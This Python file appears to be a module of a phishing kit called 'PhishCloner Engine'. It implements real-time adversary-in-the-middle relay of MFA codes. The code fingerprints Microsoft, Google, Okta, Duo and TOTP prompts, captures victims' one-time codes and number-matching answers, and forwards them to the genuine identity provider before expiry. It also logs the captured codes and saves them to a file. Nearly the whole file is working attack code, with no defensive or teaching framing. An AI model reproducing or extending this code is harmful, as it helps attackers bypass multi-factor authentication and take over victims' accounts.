"""
PhishCloner Engine — Module 3: MFA Relay
Signé Ghost1o1 — v1.0.0

Relay temps-réel de tokens MFA entre la victime et l'IDP upstream.
Gère : TOTP (Time-based), Push (Duo, Okta), Number Matching (Microsoft).
"""

import asyncio
import base64
import hashlib
import hmac
import json
import logging
import re
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

log = logging.getLogger("PhishCloner.MFA")


@dataclass
class MFAToken:
    """Token MFA capturé."""
    provider: str  # microsoft_authenticator, google_prompt, okta_verify, duo_push, totp
    code: str
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    source_ip: str = "?"
    user_agent: str = "?"
    used: bool = False
    expires_at: Optional[str] = None


class MFARelay:
    """
    Module 3: MFA Token Relay — Adversary-in-the-Middle MFA bypass.

    Stratégies:
    - TOTP : on accepte n'importe quel code TOTP, on le relaie en moins de 30s
    - Push : on simule un WebSocket vers la victime pour transmettre l'approbation
    - Number Matching : on intercepte le challenge, le relaie à la victime,
                        récupère la réponse, et la renvoie à l'upstream
    """

    RELAY_TIMEOUT = 30  # seconds
    SUPPORTED_PROVIDERS = {
        "microsoft_authenticator": {
            "type": "number_match",
            "field": "idTxtBx_SAOTCC_OTC",
            "regex": r"^\d{6,8}$",
        },
        "google_prompt": {
            "type": "push",
            "field": "qreauth",
            "regex": r".{1,256}",
        },
        "okta_verify": {
            "type": "push",
            "field": "credentials.passcode",
            "regex": r"^\d{6}$",
        },
        "duo_push": {
            "type": "push",
            "field": "factor",
            "regex": r"^(Duo|phone|push)$",
        },
        "totp": {
            "type": "totp",
            "field": "code",
            "regex": r"^\d{6}$",
        },
        "sms": {
            "type": "sms",
            "field": "code",
            "regex": r"^\d{4,8}$",
        },
    }

    def __init__(self, max_concurrent: int = 50):
        self.max_concurrent = max_concurrent
        self.active_relays: Dict[str, Dict] = {}
        self.tokens: List[MFAToken] = []
        self.stats = {
            "captured": 0,
            "relayed": 0,
            "expired": 0,
            "rejected": 0,
        }

    def detect_provider(self, body: Dict, headers: Dict) -> Optional[str]:
        """Détecte le provider MFA à partir du body/headers."""
        # Microsoft
        if any(k in str(body).lower() for k in ["sareadytosignin", "saread", "otc", "saotcc"]):
            return "microsoft_authenticator"

        # Google
        if "google.com" in str(headers.get("Referer", "")) or "qreauth" in str(body).lower():
            return "google_prompt"

        # Okta
        if "okta" in str(headers.get("Referer", "")).lower() or "passcode" in str(body).lower():
            return "okta_verify"

        # Duo
        if "duo" in str(headers.get("Referer", "")).lower():
            return "duo_push"

        # Generic TOTP
        for k, v in body.items():
            if isinstance(v, str) and re.match(r"^\d{6}$", v) and any(p in k.lower() for p in ["code", "otp", "totp"]):
                return "totp"

        return None

    async def relay_totp(
        self, token: str, upstream_submit: callable, source_ip: str = "?"
    ) -> Tuple[bool, MFAToken]:
        """
        Relaye un code TOTP en temps réel.

        Args:
            token: Code TOTP capturé (6 digits)
            upstream_submit: Async callable qui soumet le code à l'upstream
            source_ip: IP source de la requête

        Returns:
            (success, MFAToken)
        """
        if not re.match(r"^\d{6}$", token):
            self.stats["rejected"] += 1
            return False, MFAToken(provider="totp", code=token, source_ip=source_ip)

        mfa_token = MFAToken(
            provider="totp",
            code=token,
            source_ip=source_ip,
            expires_at=(datetime.utcnow() + timedelta(seconds=30)).isoformat(),
        )
        self.tokens.append(mfa_token)
        self.stats["captured"] += 1

        log.info(f"🔑 TOTP captured: {token} from {source_ip}")

        # Relay within timeout
        try:
            success = await asyncio.wait_for(
                upstream_submit(token), timeout=self.RELAY_TIMEOUT
            )
            mfa_token.used = success
            if success:
                self.stats["relayed"] += 1
                log.info(f"✅ TOTP relayed successfully: {token}")
            else:
                self.stats["expired"] += 1
                log.warning(f"⏱️ TOTP relay failed/expired: {token}")
            return success, mfa_token
        except asyncio.TimeoutError:
            self.stats["expired"] += 1
            mfa_token.used = False
            log.warning(f"⏱️ TOTP relay timeout: {token}")
            return False, mfa_token

    async def relay_number_match(
        self,
        challenge_code: str,
        victim_response_future: asyncio.Future,
        upstream_submit: callable,
        source_ip: str = "?",
    ) -> Tuple[bool, Dict]:
        """
        Relaye un challenge Number Matching (Microsoft Authenticator).

        1. Recevoir le challenge de l'upstream (ex: "42")
        2. Afficher à la victime (via WebSocket ou pop-up)
        3. Victime répond avec le bon numéro
        4. Relayer la réponse à l'upstream
        """
        log.info(f"📱 Number match challenge: {challenge_code} → victim {source_ip}")
        relay_id = hashlib.sha256(f"{challenge_code}{time.time()}".encode()).hexdigest()[:16]
        self.active_relays[relay_id] = {
            "challenge": challenge_code,
            "source_ip": source_ip,
            "started": time.time(),
        }

        try:
            # Wait for victim response
            victim_response = await asyncio.wait_for(
                victim_response_future, timeout=self.RELAY_TIMEOUT
            )
            log.info(f"📱 Victim responded: {victim_response}")

            # Relay to upstream
            success = await asyncio.wait_for(
                upstream_submit(victim_response), timeout=self.RELAY_TIMEOUT
            )
            if success:
                self.stats["relayed"] += 1
            return success, {"relay_id": relay_id, "challenge": challenge_code, "response": victim_response}

        except asyncio.TimeoutError:
            self.stats["expired"] += 1
            log.warning(f"📱 Number match timeout: {challenge_code}")
            return False, {"relay_id": relay_id, "challenge": challenge_code, "error": "timeout"}
        finally:
            self.active_relays.pop(relay_id, None)

    def get_active_relays(self) -> List[Dict]:
        """Retourne la liste des relays actifs (pour monitoring)."""
        return [
            {"relay_id": rid, **r, "elapsed": time.time() - r["started"]}
            for rid, r in self.active_relays.items()
        ]

    def save_tokens(self, output_path: str = "phish_sessions/mfa_tokens.jsonl") -> Path:
        """Save captured MFA tokens to file."""
        path = Path(output_path)
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w") as f:
            for token in self.tokens:
                f.write(json.dumps(token.__dict__) + "\n")
        log.info(f"MFA tokens saved: {path} ({len(self.tokens)} tokens)")
        return path
